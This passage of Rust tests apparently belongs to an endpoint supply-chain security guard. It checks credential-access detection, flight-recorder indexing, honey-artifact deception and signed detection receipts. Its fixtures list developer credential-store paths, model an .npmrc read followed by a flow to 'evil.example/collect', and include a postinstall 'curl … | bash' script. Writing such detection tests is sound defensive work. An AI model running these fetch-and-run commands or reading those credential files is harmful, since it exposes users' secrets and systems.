            .find(|node| node.kind == CausalNodeKind::BrowserDownload)
            .unwrap_or_else(|| panic!("missing browser download node"));
        assert_eq!(download_node.attributes["contentHash"], content_hash);
        assert_eq!(download_node.attributes["byteCount"], 8192);

        let report = EndpointTelemetryPrivacyReport::from_observations(
            &[round_trip],
            EndpointTelemetryPrivacyMode::HashesFeatures,
        );
        let projections = &report.observations[0].projections;
        assert!(projections.iter().any(|projection| {
            projection.field_path == "event.browserDownload.contentHash"
                && projection.redaction_class == EndpointEvidenceRedactionClass::MetadataOnly
                && projection.feature_value.as_deref() == Some(content_hash)
        }));
        assert!(projections.iter().any(|projection| {
            projection.field_path == "event.browserDownload.byteCount"
                && projection.redaction_class == EndpointEvidenceRedactionClass::MetadataOnly
                && projection.feature_value.as_deref() == Some("8192")
        }));
    }

    #[test]
    fn policy_event_secret_scope_maps_to_typed_credential_detection() {
        let event = PolicyEvent {
            event_id: "policy-secret-1".to_string(),
            event_type: PolicyEventType::SecretAccess,
            timestamp: Utc::now(),
            session_id: Some("session".to_string()),
            data: PolicyEventData::Secret(crate::event::SecretEventData {
                secret_name: "NPM_TOKEN".to_string(),
                scope: "npm_registry".to_string(),
            }),
            metadata: Some(serde_json::json!({
                "process": {
                    "pid": 9,
                    "image": "/usr/bin/node",
                    "commandLine": "node install.js"
                }
            })),
            context: None,
        };

        let observation = EndpointObservation::from_policy_event(&event);

        match &observation.event {
            EndpointEvent::CredentialAccess { kind, name, .. } => {
                assert_eq!(kind, &CredentialKind::PackageRegistryToken);
                assert_eq!(name.as_deref(), Some("NPM_TOKEN"));
            }
            other => panic!("unexpected event: {other:?}"),
        }

        let findings = SupplyChainRuntimeGuard::new().evaluate(&observation);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "supply_chain.developer_secret_access");
        assert!(findings[0].evidence.iter().any(|item| {
            item.key == "credentialKind" && item.value == "package_registry_token"
        }));
    }

    #[test]
    fn supply_chain_guard_flags_developer_cli_token_store_access() {
        let guard = SupplyChainRuntimeGuard::new();
        let cases = [
            "/Users/alice/.config/gh/hosts.yml",
            "/Users/alice/.config/glab-cli/config.yml",
            "/Users/alice/.config/hub",
        ];

        for path in cases {
            let event = observation(EndpointEvent::CredentialAccess {
                kind: CredentialKind::Other("unknown".to_string()),
                path: Some(path.to_string()),
                name: Some("cli-token-store".to_string()),
            });

            let findings = guard.evaluate(&event);

            let finding = findings
                .iter()
                .find(|finding| finding.rule_id == "supply_chain.developer_secret_access")
                .unwrap_or_else(|| panic!("missing developer secret finding for {path}"));
            assert!(
                finding
                    .evidence
                    .iter()
                    .any(|item| item.key == "path" && item.value == path),
                "missing path evidence for {path}"
            );
        }
    }

    #[test]
    fn supply_chain_guard_flags_local_signing_key_store_access() {
        let guard = SupplyChainRuntimeGuard::new();
        let cases = [
            "/Users/alice/.config/sops/age/keys.txt",
            "/Users/alice/.age/key.txt",
            "/Users/alice/.gnupg/private-keys-v1.d/ABCD1234.key",
            "/Users/alice/.gnupg/secring.gpg",
        ];

        for path in cases {
            let event = observation(EndpointEvent::CredentialAccess {
                kind: CredentialKind::Other("unknown".to_string()),
                path: Some(path.to_string()),
                name: Some("signing-key-store".to_string()),
            });

            let findings = guard.evaluate(&event);

            let finding = findings
                .iter()
                .find(|finding| finding.rule_id == "supply_chain.developer_secret_access")
                .unwrap_or_else(|| panic!("missing developer secret finding for {path}"));
            assert!(
                finding
                    .evidence
                    .iter()
                    .any(|item| item.key == "path" && item.value == path),
                "missing path evidence for {path}"
            );
        }
    }

    #[test]
    fn supply_chain_guard_flags_cloud_credential_store_access() {
        let guard = SupplyChainRuntimeGuard::new();
        let cases = [
            "/Users/alice/.kube/config",
            "/Users/alice/.terraform.d/credentials.tfrc.json",
            "/Users/alice/.terraformrc",
            "/Users/alice/.config/pulumi/credentials.json",
            "/Users/alice/.pulumi/credentials.json",
        ];

        for path in cases {
            let event = observation(EndpointEvent::CredentialAccess {
                kind: CredentialKind::Other("unknown".to_string()),
                path: Some(path.to_string()),
                name: Some("cloud-credential-store".to_string()),
            });

            let findings = guard.evaluate(&event);

            let finding = findings
                .iter()
                .find(|finding| finding.rule_id == "supply_chain.developer_secret_access")
                .unwrap_or_else(|| panic!("missing developer secret finding for {path}"));
            assert!(
                finding
                    .evidence
                    .iter()
                    .any(|item| item.key == "path" && item.value == path),
                "missing path evidence for {path}"
            );
        }
    }

    #[test]
    fn supply_chain_guard_flags_package_manager_credential_store_access() {
        let guard = SupplyChainRuntimeGuard::new();
        let cases = [
            "/Users/alice/.yarnrc.yml",
            "/Users/alice/.config/pip/pip.conf",
            "/Users/alice/.config/pypoetry/auth.toml",
            "/Users/alice/Library/Application Support/pypoetry/auth.toml",
            "/Users/alice/.m2/settings.xml",
            "/Users/alice/.gradle/gradle.properties",
            "/Users/alice/.nuget/NuGet/NuGet.Config",
        ];

        for path in cases {
            let event = observation(EndpointEvent::CredentialAccess {
                kind: CredentialKind::Other("unknown".to_string()),
                path: Some(path.to_string()),
                name: Some("package-manager-credential-store".to_string()),
            });

            let findings = guard.evaluate(&event);

            let finding = findings
                .iter()
                .find(|finding| finding.rule_id == "supply_chain.developer_secret_access")
                .unwrap_or_else(|| panic!("missing developer secret finding for {path}"));
            assert!(
                finding
                    .evidence
                    .iter()
                    .any(|item| item.key == "path" && item.value == path),
                "missing path evidence for {path}"
            );
        }
    }

    #[test]
    fn policy_event_browser_cookie_secret_can_trigger_honey_deception() {
        let root = temp_root();
        let plan = DeceptionPlan::standard(&root, "endpoint-a");
        let artifact = plan
            .artifacts
            .iter()
            .find(|artifact| artifact.kind == HoneyArtifactKind::BrowserCookieJar)
            .unwrap();
        let event = PolicyEvent {
            event_id: "policy-cookie-1".to_string(),
            event_type: PolicyEventType::SecretAccess,
            timestamp: Utc::now(),
            session_id: Some("session".to_string()),
            data: PolicyEventData::Secret(crate::event::SecretEventData {
                secret_name: format!("intranet.invalid/session={}", artifact.marker),
                scope: "browser_cookie".to_string(),
            }),
            metadata: None,
            context: None,
        };

        let observation = EndpointObservation::from_policy_event(&event);

        match &observation.event {
            EndpointEvent::CredentialAccess { kind, .. } => {
                assert_eq!(kind, &CredentialKind::BrowserCookie);
            }
            other => panic!("unexpected event: {other:?}"),
        }

        let findings = SupplyChainRuntimeGuard::with_honey_artifacts(plan.artifacts.clone())
            .evaluate(&observation);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "deception.honey_artifact_touched");
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| item.key == "matchType" && item.value == "browser_cookie"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_flight_recorder_persists_and_rebuilds_graph() {
        let root = temp_root();
        let path = root.join("flight-recorder.jsonl");
        let mut recorder = EndpointFlightRecorder::open(&path).unwrap();

        let file = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/.npmrc".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut network = observation(EndpointEvent::NetworkFlow {
            host: "evil.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://evil.example/collect".to_string()),
        });
        network.observation_id = "network-rebuild-1".to_string();

        recorder
            .append_observations(&[file.clone(), network.clone()])
            .unwrap();
        assert_eq!(recorder.observation_count(), 2);
        assert!(path.is_file());
        assert!(recorder
            .graph()
            .edges
            .iter()
            .any(|edge| edge.kind == CausalEdgeKind::Connected));

        let reopened = EndpointFlightRecorder::open(&path).unwrap();
        assert_eq!(reopened.observation_count(), 2);
        assert_eq!(reopened.graph().nodes.len(), recorder.graph().nodes.len());
        assert_eq!(reopened.graph().edges.len(), recorder.graph().edges.len());
        assert_eq!(reopened.path(), Some(path.as_path()));
        assert!(endpoint_flight_recorder_index_path(&path).is_file());

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_flight_recorder_indexes_latest_matching_history_window() {
        let root = temp_root();
        let path = root.join("flight-recorder-window.jsonl");
        let mut recorder = EndpointFlightRecorder::open(&path).unwrap();
        let base = Utc::now();
        let mut first_network = observation(EndpointEvent::NetworkFlow {
            host: "first.example.invalid".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: None,
        });
        first_network.observation_id = "network-window-1".to_string();
        first_network.timestamp = base;
        let mut file = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/.npmrc".to_string(),
            source_url: None,
            content_preview: None,
        });
        file.observation_id = "file-window-1".to_string();
        file.timestamp = base + chrono::Duration::seconds(1);
        let mut second_network = observation(EndpointEvent::NetworkFlow {
            host: "second.example.invalid".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: None,
        });
        second_network.observation_id = "network-window-2".to_string();
        second_network.timestamp = base + chrono::Duration::seconds(2);
        let mut third_network = observation(EndpointEvent::NetworkFlow {
            host: "third.example.invalid".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: None,
        });
        third_network.observation_id = "network-window-3".to_string();
        third_network.timestamp = base + chrono::Duration::seconds(3);

        recorder
            .append_observations(&[
                first_network,
                file,
                second_network.clone(),
                third_network.clone(),
            ])
            .unwrap();

        let window = recorder
            .read_indexed_observation_window(2, |entry| entry.event_kind == "network_flow")
            .unwrap();

        assert_eq!(window.selection_mode, "sidecar_index_seek");
        assert_eq!(
            window.index_path.as_deref(),
            Some(endpoint_flight_recorder_index_path(&path).as_path())
        );
        assert_eq!(window.total_observation_count, 4);
        assert_eq!(window.matched_observation_count, 3);
        assert_eq!(
            window
                .selected_observations
                .iter()
                .map(|observation| observation.observation_id.as_str())
                .collect::<Vec<_>>(),
            vec!["network-window-2", "network-window-3"]
        );

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_flight_recorder_indexes_identity_metadata_for_history_selection() {
        let root = temp_root();
        let path = root.join("flight-recorder-identity-index.jsonl");
        let mut recorder = EndpointFlightRecorder::open(&path).unwrap();
        let mut matching = observation(EndpointEvent::CredentialAccess {
            kind: CredentialKind::CloudCredential,
            path: Some("/Users/alice/.config/cloud/token".to_string()),
            name: Some("cloud-token".to_string()),
        });
        matching.observation_id = "identity-index-match".to_string();
        matching.host_id = Some("endpoint-a".to_string());
        matching.user_id = Some("alice@example.com".to_string());
        matching.session_id = Some("session-a".to_string());
        matching.process.process_guid = Some("process-a".to_string());
        matching.process.parent_process_guid = Some("parent-process-a".to_string());
        matching.process.image = Some("/usr/local/bin/codex".to_string());
        matching.process.command_line = Some("/usr/local/bin/codex exec task".to_string());
        matching.metadata.insert(
            "agentId".to_string(),
            serde_json::Value::String("agent-codex".to_string()),
        );
        matching.metadata.insert(
            "workloadId".to_string(),
            serde_json::Value::String("workload-local".to_string()),
        );
        matching.metadata.insert(
            "approvalId".to_string(),
            serde_json::Value::String("approval-123".to_string()),
        );
        matching.metadata.insert(
            "toolName".to_string(),
            serde_json::Value::String("mcp__browser__open_url".to_string()),
        );
        matching.metadata.insert(
            "toolCallId".to_string(),
            serde_json::Value::String("tool-call-123".to_string()),
        );
        let mut other = matching.clone();
        other.observation_id = "identity-index-other".to_string();
        other.session_id = Some("session-b".to_string());
        other.metadata.insert(
            "agentId".to_string(),
            serde_json::Value::String("agent-other".to_string()),
        );

        recorder
            .append_observations(&[matching.clone(), other])
            .unwrap();

        let entries =
            read_endpoint_observation_index(&endpoint_flight_recorder_index_path(&path)).unwrap();
        let indexed = entries
            .iter()
            .find(|entry| entry.observation_id == "identity-index-match")
            .unwrap();
        assert_eq!(indexed.host_id.as_deref(), Some("endpoint-a"));
        assert_eq!(indexed.user_id.as_deref(), Some("alice@example.com"));
        assert_eq!(indexed.session_id.as_deref(), Some("session-a"));
        assert_eq!(indexed.process_guid.as_deref(), Some("process-a"));
        assert_eq!(
            indexed.parent_process_guid.as_deref(),
            Some("parent-process-a")
        );
        assert_eq!(
            indexed.process_image_hash.as_deref(),
            Some(sha256(b"/usr/local/bin/codex").to_hex_prefixed().as_str())
        );
        assert_eq!(
            indexed.process_command_line_hash.as_deref(),
            Some(
                sha256(b"/usr/local/bin/codex exec task")
                    .to_hex_prefixed()
                    .as_str()
            )
        );
        assert_eq!(indexed.agent_id.as_deref(), Some("agent-codex"));
        assert_eq!(indexed.workload_id.as_deref(), Some("workload-local"));
        assert_eq!(indexed.approval_id.as_deref(), Some("approval-123"));
        assert_eq!(indexed.tool_name.as_deref(), Some("mcp__browser__open_url"));
        assert_eq!(indexed.tool_call_id.as_deref(), Some("tool-call-123"));
        assert_eq!(indexed.credential_kind.as_deref(), Some("cloud_credential"));
        assert_eq!(indexed.event_target.as_deref(), Some("cloud-token"));
        assert_eq!(
            indexed.event_target_hash.as_deref(),
            Some(sha256(b"cloud-token").to_hex_prefixed().as_str())
        );

        let window = recorder
            .read_indexed_observation_window(10, |entry| {
                entry.session_id.as_deref() == Some("session-a")
                    && entry.agent_id.as_deref() == Some("agent-codex")
                    && entry.parent_process_guid.as_deref() == Some("parent-process-a")
                    && entry.process_image_hash.as_deref()
                        == Some(sha256(b"/usr/local/bin/codex").to_hex_prefixed().as_str())
                    && entry.process_command_line_hash.as_deref()
                        == Some(
                            sha256(b"/usr/local/bin/codex exec task")
                                .to_hex_prefixed()
                                .as_str(),
                        )
                    && entry.workload_id.as_deref() == Some("workload-local")
                    && entry.approval_id.as_deref() == Some("approval-123")
                    && entry.tool_name.as_deref() == Some("mcp__browser__open_url")
                    && entry.tool_call_id.as_deref() == Some("tool-call-123")
                    && entry.credential_kind.as_deref() == Some("cloud_credential")
                    && entry.event_target.as_deref() == Some("cloud-token")
                    && entry.event_target_hash.as_deref()
                        == Some(sha256(b"cloud-token").to_hex_prefixed().as_str())
            })
            .unwrap();

        assert_eq!(window.selection_mode, "sidecar_index_seek");
        assert_eq!(window.matched_observation_count, 1);
        assert_eq!(window.selected_observations.len(), 1);
        assert_eq!(window.selected_observations[0], matching);

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_flight_recorder_rebuilds_corrupt_sidecar_index_on_seek_mismatch() {
        let root = temp_root();
        let path = root.join("flight-recorder-corrupt-index.jsonl");
        let mut recorder = EndpointFlightRecorder::open(&path).unwrap();
        let mut network = observation(EndpointEvent::NetworkFlow {
            host: "corrupt-index.example.invalid".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: None,
        });
        network.observation_id = "network-corrupt-index-1".to_string();
        recorder.append_observations(&[network.clone()]).unwrap();

        let index_path = endpoint_flight_recorder_index_path(&path);
        let mut entries = read_endpoint_observation_index(&index_path).unwrap();
        assert_eq!(entries.len(), 1);
        entries[0].observation_id = "network-corrupt-index-tampered".to_string();
        replace_endpoint_observation_index(&path, &entries).unwrap();

        let window = recorder
            .read_indexed_observation_window(1, |entry| entry.event_kind == "network_flow")
            .unwrap();

        assert_eq!(window.selection_mode, "sidecar_index_seek");
        assert_eq!(window.selected_observations.len(), 1);
        assert_eq!(
            window.selected_observations[0].observation_id,
            "network-corrupt-index-1"
        );
        let rebuilt_entries = read_endpoint_observation_index(&index_path).unwrap();
        assert_eq!(rebuilt_entries[0].observation_id, "network-corrupt-index-1");

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_flight_recorder_rebuilds_sidecar_index_on_event_kind_mismatch() {
        let root = temp_root();
        let path = root.join("flight-recorder-event-kind-index.jsonl");
        let mut recorder = EndpointFlightRecorder::open(&path).unwrap();
        let mut file = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/.npmrc".to_string(),
            source_url: None,
            content_preview: None,
        });
        file.observation_id = "file-event-kind-index-1".to_string();
        recorder.append_observations(&[file]).unwrap();

        let index_path = endpoint_flight_recorder_index_path(&path);
        let mut entries = read_endpoint_observation_index(&index_path).unwrap();
        assert_eq!(entries.len(), 1);
        entries[0].event_kind = "network_flow".to_string();
        replace_endpoint_observation_index(&path, &entries).unwrap();

        let window = recorder
            .read_indexed_observation_window(1, |entry| entry.event_kind == "network_flow")
            .unwrap();

        assert_eq!(window.selection_mode, "sidecar_index_seek");
        assert_eq!(window.total_observation_count, 1);
        assert_eq!(window.matched_observation_count, 0);
        assert!(window.selected_observations.is_empty());
        let rebuilt_entries = read_endpoint_observation_index(&index_path).unwrap();
        assert_eq!(rebuilt_entries[0].event_kind, "file_access");

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_flight_recorder_rebuilds_sidecar_index_on_timestamp_mismatch() {
        let root = temp_root();
        let path = root.join("flight-recorder-timestamp-index.jsonl");
        let mut recorder = EndpointFlightRecorder::open(&path).unwrap();
        let base = Utc::now();
        let mut file = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/.npmrc".to_string(),
            source_url: None,
            content_preview: None,
        });
        file.observation_id = "file-timestamp-index-1".to_string();
        file.timestamp = base;
        recorder.append_observations(&[file]).unwrap();

        let index_path = endpoint_flight_recorder_index_path(&path);
        let mut entries = read_endpoint_observation_index(&index_path).unwrap();
        assert_eq!(entries.len(), 1);
        entries[0].timestamp = base + chrono::Duration::hours(1);
        replace_endpoint_observation_index(&path, &entries).unwrap();

        let cutoff = base + chrono::Duration::minutes(30);
        let window = recorder
            .read_indexed_observation_window(1, |entry| entry.timestamp >= cutoff)
            .unwrap();

        assert_eq!(window.selection_mode, "sidecar_index_seek");
        assert_eq!(window.total_observation_count, 1);
        assert_eq!(window.matched_observation_count, 0);
        assert!(window.selected_observations.is_empty());
        let rebuilt_entries = read_endpoint_observation_index(&index_path).unwrap();
        assert_eq!(rebuilt_entries[0].timestamp, base);

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_flight_recorder_rebuilds_sidecar_indexes_with_unknown_fields() {
        let root = temp_root();
        let path = root.join("flight-recorder-unknown-index-field.jsonl");
        let mut recorder = EndpointFlightRecorder::open(&path).unwrap();
        let mut network = observation(EndpointEvent::NetworkFlow {
            host: "unknown-index.example.invalid".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: None,
        });
        network.observation_id = "network-unknown-index-field-1".to_string();
        recorder.append_observations(&[network]).unwrap();

        let history_index_path = endpoint_flight_recorder_index_path(&path);
        let history_entries = read_endpoint_observation_index(&history_index_path).unwrap();
        assert_eq!(history_entries.len(), 1);
        let mut unknown_history_entry = serde_json::to_value(&history_entries[0]).unwrap();
        unknown_history_entry["shadowByteOffset"] =
            serde_json::Value::String("must not be ignored".to_string());
        write_jsonl_value(&history_index_path, &unknown_history_entry);
        assert_anyhow_error_mentions_unknown_field(
            read_endpoint_observation_index(&history_index_path).unwrap_err(),
            "shadowByteOffset",
        );

        let window = recorder
            .read_indexed_observation_window(1, |entry| entry.event_kind == "network_flow")
            .unwrap();
        assert_eq!(window.selection_mode, "sidecar_index_seek");
        assert_eq!(window.selected_observations.len(), 1);
        let rebuilt_history_entries = read_endpoint_observation_index(&history_index_path).unwrap();
        assert_eq!(
            rebuilt_history_entries[0].observation_id,
            "network-unknown-index-field-1"
        );

        let (node_index_path, node_entries) = recorder.read_graph_node_index().unwrap();
        assert!(!node_entries.is_empty());
        let mut unknown_node_entry = serde_json::to_value(&node_entries[0]).unwrap();
        unknown_node_entry["shadowAttribute"] =
            serde_json::Value::String("must not be ignored".to_string());
        write_jsonl_value(&node_index_path, &unknown_node_entry);
        assert_anyhow_error_mentions_unknown_field(
            read_endpoint_graph_node_index(&node_index_path).unwrap_err(),
            "shadowAttribute",
        );
        let (_, rebuilt_node_entries) = recorder.read_graph_node_index().unwrap();
        assert_eq!(
            rebuilt_node_entries,
            endpoint_graph_node_index_entries(recorder.graph())
        );

        let (edge_index_path, edge_entries) = recorder.read_graph_edge_index().unwrap();
        assert!(!edge_entries.is_empty());
        let mut unknown_edge_entry = serde_json::to_value(&edge_entries[0]).unwrap();
        unknown_edge_entry["shadowObservationId"] =
            serde_json::Value::String("must not be ignored".to_string());
        write_jsonl_value(&edge_index_path, &unknown_edge_entry);
        assert_anyhow_error_mentions_unknown_field(
            read_endpoint_graph_edge_index(&edge_index_path).unwrap_err(),
            "shadowObservationId",
        );
        let (_, rebuilt_edge_entries) = recorder.read_graph_edge_index().unwrap();
        assert_eq!(
            rebuilt_edge_entries,
            endpoint_graph_edge_index_entries(recorder.graph())
        );

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_flight_recorder_reports_corrupt_jsonl_line() {
        let root = temp_root();
        let path = root.join("flight-recorder.jsonl");
        fs::create_dir_all(&root).unwrap();
        fs::write(&path, "{not-json}\n").unwrap();

        let err = EndpointFlightRecorder::open(&path).unwrap_err();
        assert!(err
            .to_string()
            .contains("invalid endpoint observation JSONL"));
        assert!(err.to_string().contains(":1"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_decision_receipt_for_detection_signs_and_verifies() {
        let guard = SupplyChainRuntimeGuard::new();
        let event = observation(EndpointEvent::PackageScript {
            manager: PackageManager::Npm,
            package: Some("leftpad-plus".to_string()),
            phase: "postinstall".to_string(),
            script: "curl https://example.invalid/payload.sh | bash -c".to_string(),
            working_directory: Some("/tmp/pkg".to_string()),
        });
        let finding = guard.evaluate(&event).into_iter().next().unwrap();
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let keypair = hush_core::Keypair::from_seed(&[7u8; 32]);

        let mut receipt = valid_detection_receipt(
            1,
            "endpoint-1",
            "local-agent:endpoint-1",
            &event,
            &finding,
            graph_recorder.graph(),
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(signed.receipt.receipt_id, Some(receipt.receipt_id()));
        assert!(!signed.receipt.verdict.passed);
        assert_eq!(
            signed.receipt.verdict.gate_id.as_deref(),
            Some("supply_chain.install_script.risky")
        );
        assert!(signed
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .and_then(|metadata| metadata.get("decision"))
            .and_then(|decision| decision.get("findingId"))
            .and_then(serde_json::Value::as_str)
            .is_some_and(|value| value == finding.finding_id));
        assert!(receipt.evidence.iter().all(|item| item.raw_value.is_none()
            && item.redaction_class == EndpointEvidenceRedactionClass::HashOnly
            && item.value_hash.starts_with("0x")));
        assert!(receipt.graph.process_node_id.is_some());
        assert!(!receipt.graph.edge_ids.is_empty());
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "detectionFindingId"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "detectionGraphSliceId"));

        let mut receipt_value = serde_json::to_value(&receipt)
            .unwrap_or_else(|err| panic!("failed to serialize endpoint receipt: {err}"));
        receipt_value["unsignedExtra"] = serde_json::Value::String("must not be ignored".into());
        let err = serde_json::from_value::<EndpointDecisionReceipt>(receipt_value)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("unknown field") && err.contains("unsignedExtra"),
            "expected unknown endpoint receipt field to be rejected, got {err}"
        );

        let mut clock_value = serde_json::to_value(&receipt.clock)
            .unwrap_or_else(|err| panic!("failed to serialize endpoint clock: {err}"));
        clock_value["shadowUncertaintyMs"] = serde_json::Value::Number(7.into());
        let err = serde_json::from_value::<EndpointClockState>(clock_value)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("unknown field") && err.contains("shadowUncertaintyMs"),
            "expected unknown endpoint clock field to be rejected, got {err}"
        );

        let mut actor_value = serde_json::to_value(&receipt.actor)
            .unwrap_or_else(|err| panic!("failed to serialize endpoint actor: {err}"));
        actor_value["shadowSessionId"] = serde_json::Value::String("must not be ignored".into());
        let err = serde_json::from_value::<EndpointDecisionActor>(actor_value)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("unknown field") && err.contains("shadowSessionId"),
            "expected unknown endpoint actor field to be rejected, got {err}"
        );

        let mut decision_value = serde_json::to_value(&receipt.decision)
            .unwrap_or_else(|err| panic!("failed to serialize endpoint decision: {err}"));
        decision_value["shadowAction"] = serde_json::Value::String("allow".into());
        let err = serde_json::from_value::<EndpointDecisionRecord>(decision_value)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("unknown field") && err.contains("shadowAction"),
            "expected unknown endpoint decision field to be rejected, got {err}"
        );

        let mut policy_value = serde_json::to_value(&receipt.policy)
            .unwrap_or_else(|err| panic!("failed to serialize endpoint policy: {err}"));
        policy_value["shadowPolicyEpoch"] = serde_json::Value::Number(8.into());
        let err = serde_json::from_value::<EndpointPolicySnapshot>(policy_value)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("unknown field") && err.contains("shadowPolicyEpoch"),
            "expected unknown endpoint policy field to be rejected, got {err}"
        );

        let mut signer_value = serde_json::to_value(&receipt.signer)
            .unwrap_or_else(|err| panic!("failed to serialize endpoint signer: {err}"));
        signer_value["shadowSignerPublicKey"] =
            serde_json::Value::String("must not be ignored".into());
        let err = serde_json::from_value::<EndpointReceiptSigner>(signer_value)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("unknown field") && err.contains("shadowSignerPublicKey"),
            "expected unknown endpoint signer field to be rejected, got {err}"
        );

        let mut graph_value = serde_json::to_value(&receipt.graph)
            .unwrap_or_else(|err| panic!("failed to serialize endpoint graph reference: {err}"));
        graph_value["shadowGraphSliceId"] = serde_json::Value::String("must not be ignored".into());
        let err = serde_json::from_value::<EndpointGraphReference>(graph_value)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("unknown field") && err.contains("shadowGraphSliceId"),
            "expected unknown endpoint graph reference field to be rejected, got {err}"
        );

        let mut sensor_state_value = serde_json::to_value(&receipt.sensor_state)
            .unwrap_or_else(|err| panic!("failed to serialize endpoint sensor state: {err}"));
        sensor_state_value["shadowProviderCount"] = serde_json::Value::Number(1.into());
        let err = serde_json::from_value::<EndpointSensorState>(sensor_state_value)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("unknown field") && err.contains("shadowProviderCount"),
            "expected unknown endpoint sensor state field to be rejected, got {err}"
        );

        let mut provider_state_value = serde_json::to_value(&receipt.sensor_state.providers[0])
            .unwrap_or_else(|err| panic!("failed to serialize endpoint provider state: {err}"));
        provider_state_value["shadowRuntimeStatus"] =
            serde_json::Value::String("must not be ignored".into());
        let err = serde_json::from_value::<EndpointProviderState>(provider_state_value)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("unknown field") && err.contains("shadowRuntimeStatus"),
            "expected unknown endpoint provider state field to be rejected, got {err}"
        );

        let mut mismatched_finding_id = receipt.clone();
        if let Some(finding_id_evidence) = mismatched_finding_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "detectionFindingId")
        {
            *finding_id_evidence =
                EndpointReceiptEvidence::hashed("detectionFindingId", "finding:other");
        }
        assert!(mismatched_finding_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("detection finding id evidence hash"));

        let mut relabeled_finding_id = receipt.clone();
        relabeled_finding_id.decision.finding_id = Some("finding:other".to_string());
        if let Some(finding_id_evidence) = relabeled_finding_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "detectionFindingId")
        {
            *finding_id_evidence =
                EndpointReceiptEvidence::hashed("detectionFindingId", "finding:other");
        }
        assert!(relabeled_finding_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("detection finding id"));

        let mut missing_graph_slice = receipt.clone();
        missing_graph_slice
            .evidence
            .retain(|item| item.key != "detectionGraphSliceId");
        assert!(missing_graph_slice
            .validate()
            .unwrap_err()
            .to_string()
            .contains("detection graph slice evidence"));

        let mut mismatched_process_reference = receipt.clone();
        mismatched_process_reference.graph.process_node_id = Some("node:other".to_string());
        if let Some(process_node_evidence) = mismatched_process_reference
            .evidence
            .iter_mut()
            .find(|item| item.key == "detectionProcessNodeId")
        {
            *process_node_evidence =
                EndpointReceiptEvidence::hashed("detectionProcessNodeId", "node:other");
        }
        assert!(mismatched_process_reference
            .validate()
            .unwrap_err()
            .to_string()
            .contains("detection process node reference"));

        let mut mismatched_graph_slice_reference = receipt.clone();
        mismatched_graph_slice_reference.graph.graph_slice_id =
            Some("graph_slice:other".to_string());
        if let Some(graph_slice_evidence) = mismatched_graph_slice_reference
            .evidence
            .iter_mut()
            .find(|item| item.key == "detectionGraphSliceId")
        {
            *graph_slice_evidence =
                EndpointReceiptEvidence::hashed("detectionGraphSliceId", "graph_slice:other");
        }
        assert!(mismatched_graph_slice_reference
            .validate()
            .unwrap_err()
            .to_string()
            .contains("detection graph slice reference"));
    }

    #[test]
    fn endpoint_decision_receipt_rejects_missing_required_evidence_boundaries() {
        let guard = SupplyChainRuntimeGuard::new();
        let event = observation(EndpointEvent::CredentialAccess {
            kind: CredentialKind::PackageRegistryToken,
            path: Some("/Users/alice/.npmrc".to_string()),
            name: None,
        });
        let finding = guard.evaluate(&event).into_iter().next().unwrap();
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let valid = valid_detection_receipt(
            8,
            "endpoint-1",
            "local-agent:endpoint-1",
            &event,
            &finding,
            graph_recorder.graph(),
        );

        let mut missing_policy_hash = valid.clone();
        missing_policy_hash.policy.policy_hash.clear();
        assert!(missing_policy_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy hash"));

        let mut missing_policy_epoch = valid.clone();
        missing_policy_epoch.policy.policy_epoch = 0;
        assert!(missing_policy_epoch
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy epoch"));

        let mut missing_sensor_state = valid.clone();
        missing_sensor_state.sensor_state.providers.clear();
        assert!(missing_sensor_state
            .validate()
            .unwrap_err()
            .to_string()
            .contains("sensor state"));

        let mut missing_signer = valid;
        missing_signer.signer.signer_identity.clear();
        assert!(missing_signer
            .validate()
            .unwrap_err()
            .to_string()
